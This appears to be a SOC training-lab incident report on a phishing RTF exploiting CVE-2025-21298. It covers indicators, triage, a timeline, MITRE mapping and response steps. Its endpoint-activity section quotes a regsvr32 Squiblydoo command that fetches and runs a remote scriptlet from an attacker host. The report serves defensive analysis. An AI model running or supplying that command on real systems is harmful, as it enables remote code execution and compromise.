# Incident Report 3 — Windows OLE RCE Exploitation (CVE-2025-21298)

## 1. Alert Summary

- **Alert Name:** Windows OLE Zero-Click RCE Exploitation Detected
- **Severity:** Critical
- **Date:** Feb 04, 2025
- **Source:** LetsDefend SIEM

---

## 2. Initial Triage

The alert was triggered due to a malicious RTF attachment exploiting **CVE-2025-21298**, a critical vulnerability allowing remote code execution without user interaction.

Given the nature of the exploit (zero-click), this alert is treated as highly suspicious and likely malicious.

---

## 3. Key Indicators

- **Sender Email:** [projectmanagement@pm.me](mailto:projectmanagement@pm.me)
- **Recipient:** [Austin@letsdefend.io](mailto:Austin@letsdefend.io)
- **Source IP:** 84.38.130.118
- **User Host IP:** 172.16.17.137
- **Attachment:** mail.rtf
- **File Hash:** df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184
- **Malicious URL:** http://84.38.130.118.com/shell.sct

---

## 4. Investigation

### 4.1 Email Analysis

- Email contains an RTF attachment posing as a legitimate project-related document
- Sender is external and not verified
- Attachment flagged as malicious by multiple security vendors (25/61)

---

### 4.2 File Analysis

- File identified as RTF exploit
- Indicators show:
  - CVE-2025-21298 exploitation
  - Known exploit patterns and downloader behavior

- Likely designed to trigger code execution upon preview/open

---

### 4.3 Endpoint Activity

- Host: 172.16.17.137 (Austin)
- Suspicious command execution observed:

```
cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll
```

- Indicates use of **regsvr32.exe** to execute remote script

---

### 4.4 Attack Technique (Squiblydoo)

- `regsvr32.exe` used as a Living-off-the-Land binary
- Downloads and executes remote scriptlet (`.sct`)
- Bypasses application whitelisting and security controls

---

### 4.5 Network Activity

- Outbound connection from host to attacker infrastructure
- Connection observed:
  - **Destination IP:** 84.38.130.118
  - **Time:** 08:06 PM

- Confirms successful payload retrieval

---

### 4.6 Attack Timeline

1. Malicious email delivered with RTF attachment
2. RTF exploit triggers automatically (zero-click)
3. System executes `regsvr32.exe` command
4. Remote script (`shell.sct`) downloaded
5. Payload executed on host
6. Outbound connection established to attacker server

---

## 5. Findings

- Zero-click RTF exploit successfully executed
- regsvr32 used to download and execute malicious script
- Endpoint compromised without user interaction
- Network communication confirms payload delivery

---

## 6. Verdict

**True Positive**

Confirmed exploitation of CVE-2025-21298 leading to remote code execution and system compromise.

---

## 7. MITRE ATT&CK Mapping

- **T1566.001** — Phishing: Attachment
- **T1203** — Exploitation for Client Execution
- **T1218.010** — regsvr32 (Signed Binary Proxy Execution)
- **T1105** — Ingress Tool Transfer

---

## 8. Response Actions

- Compromised host isolated (172.16.17.137)
- Malicious IP and domain identified
- Incident escalated due to critical severity

---

## 9. Recommended Actions

- Reimage affected system
- Block attacker IP and domains
- Patch systems against CVE-2025-21298
- Conduct organization-wide scan for similar indicators
- Monitor for lateral movement or persistence

---

## 10. Conclusion

A critical zero-click RTF exploit (CVE-2025-21298) resulted in remote code execution using regsvr32 (Squiblydoo technique). The attack required no user interaction and led to successful compromise. Immediate containment actions were necessary to prevent further spread.
